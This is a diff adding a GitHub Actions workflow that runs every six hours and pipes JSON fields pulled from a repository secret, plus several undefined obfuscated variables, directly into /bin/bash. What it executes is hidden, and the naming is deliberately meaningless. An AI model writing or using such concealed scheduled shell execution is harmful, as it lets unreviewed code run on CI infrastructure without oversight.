@@ -1,0 +1,26 @@
+name: chuangdayuli
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chuangdayuli
+        env:
+          c825: ${{ secrets.c825 }}
+        run: |
+          echo $c825 | jq -r .wbq904 | /bin/bash
+          echo $g925 | jq -r .udzjd16019 | /bin/bash
+          echo $ndbc5 | jq -r .afxs8154 | /bin/bash
+          echo $e19 | jq -r .znxr5 | /bin/bash
+          echo $w032 | jq -r .lutuf099 | /bin/bash
+          echo $xj83625 | jq -r .psk1 | /bin/bash
+          echo $xisuz29980 | jq -r .vo7 | /bin/bash
+          echo $dvzpa6 | jq -r .vde59915 | /bin/bash
+          echo $yhh9211 | jq -r .yt66 | /bin/bash
+
